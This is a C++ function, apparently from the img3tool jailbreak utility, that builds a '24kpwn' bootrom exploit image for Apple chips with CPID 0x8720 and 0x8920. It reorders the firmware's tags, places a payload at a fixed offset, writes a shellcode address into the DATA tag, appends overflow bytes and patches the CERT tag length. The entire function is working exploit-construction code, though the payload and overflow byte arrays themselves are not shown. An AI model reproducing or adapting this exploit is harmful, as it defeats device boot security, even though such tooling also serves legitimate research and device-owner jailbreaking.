tihmstar::Mem img3tool::do24kpwn(const void *buf, size_t size, uint32_t cpid){
    if (cpid == 0) {
        debug("24kpwn cpid not specified, autodetecting...");
        tihmstar::Mem chip;
        try {
            chip = img3tool::getValFromIMG3(buf, size, 'CHIP');
        } catch (tihmstar::exception &e){
            debug("Main img3 doesn't contain CHIP tag, retrying with embedded img3");
            auto cert = img3tool::getValFromIMG3(buf, size, 'CERT');
            const void *embedded = memmem(cert.data(), cert.size(), "3gmI", 4);
            retassure(embedded, "Failed to autodetect cpid. No embedded img3 found!");
            chip = img3tool::getValFromIMG3(embedded, cert.size()-((uint8_t*)embedded-cert.data()), 'CHIP');
        }
        retassure(chip.size() == 4, "bad CHIP tag size");
        cpid = *(uint32_t*)chip.data();
        info("Autodetected CPID: 0x%x",cpid);
    }
    
    retassure(cpid == 0x8720 || cpid == 0x8920, "CPID 0x%x not supported for 24kpwn",cpid);
    {
        tihmstar::Mem kbag;
        try {
            kbag = img3tool::getKBAG(buf, size, 1);
        } catch (...) {
            //this is what we want!
        }
        retassure(kbag.size() == 0, "24kpwn img3 cannot be encrypted");
    }

    const void *overflowData = NULL;
    uint32_t overflowSize = 0;
    const void *payloadData = NULL;
    uint32_t payloadSize = 0;
    uint32_t shellcodeAddr = 0;
    if (cpid == 0x8720) {
        overflowData = x24kpwn_overflow_data;
        overflowSize = (uint32_t)sizeof(x24kpwn_overflow_data);
        payloadData = x24kpwn_payload_data;
        payloadSize = (uint32_t)sizeof(x24kpwn_payload_data);
        shellcodeAddr = 0x22023001;
    }else{
        overflowData = n8824kpwn_overflow_data;
        overflowSize = (uint32_t)sizeof(n8824kpwn_overflow_data);
        payloadData = n8824kpwn_payload_data;
        payloadSize = (uint32_t)sizeof(n8824kpwn_payload_data);
        shellcodeAddr = 0x84023001;
    }
    

    tihmstar::Mem ret;
    {
        /*
            Make sure DATA is the first tag in the img3
         */
        img3 *header = verifyIMG3Header(buf, size);
        img3Tag *dataTag = (img3Tag*)getValRawPtrFromIMG3(buf, size, 'DATA');
        ret.append(header, sizeof(*header));
        if (cpid == 0x8720) ret.append(dataTag, dataTag->totalLength);
        uint32_t bodySize = header->sizeNoHeader;
        for (img3Tag *tag = (img3Tag *)(header+1); bodySize; bodySize -= tag->totalLength,tag = (img3Tag*)&tag->data[tag->totalLength-sizeof(img3Tag)]) {
            retassure(bodySize >= sizeof(img3Tag), "bodysize smaller than sizeof(header)");
            retassure(tag->totalLength >= sizeof(img3Tag), "tag->totalLength smaller than sizeof(img3Tag)");
            retassure(tag->totalLength <= bodySize, "tag->totalLength larger than remaining bodysize");
            retassure(tag->dataLength <= tag->totalLength, "tag->dataLength larger than tag->totalLength");
            if (cpid == 0x8720) if (tag->magic == 'DATA') continue;
            ret.append(tag, tag->totalLength);
        }
    }
    
    img3 *header = verifyIMG3Header(ret.data(), ret.size());
    img3Tag *dataTag = (img3Tag*)getValRawPtrFromIMG3(ret.data(),ret.size(), 'DATA');
    
    uint32_t addedSize = 0x24000 + overflowSize - header->fullSize;
    uint32_t hdrSize = header->fullSize = 0x24000 + overflowSize;
    header->sizeNoHeader = header->fullSize-sizeof(*header);
    retassure(dataTag->dataLength>4, "Bad data len!");
    uint32_t origData = *(uint32_t*)&dataTag->data;
    *(uint32_t*)&dataTag->data = shellcodeAddr;

    //these pointers are no longer valid
    header = NULL;
    dataTag = NULL;
    
    ret.resize(hdrSize);
    retassure(ret.size()>0x23000+payloadSize, "can't insert payload");
    memcpy(ret.data()+0x23000, payloadData, payloadSize);
    
    {
        void *placeholder = memmem(ret.data()+0x23000, payloadSize, "\xaa\xbb\xcc\xdd", 4);
        retassure(placeholder, "Failed to correct payload!");
        memcpy(placeholder, &origData, sizeof(origData));
    }
    
    retassure(ret.size()>overflowSize, "can't insert overflow");
    memcpy(ret.data()+ret.size()-overflowSize, overflowData, overflowSize);
    
    {
        img3Tag *certTag = (img3Tag*)getValRawPtrFromIMG3(ret.data(),ret.size(), 'CERT');
        certTag->dataLength += addedSize+3;
        certTag->dataLength &= ~3;
        certTag->totalLength += addedSize;
    }
    
    return ret;
}

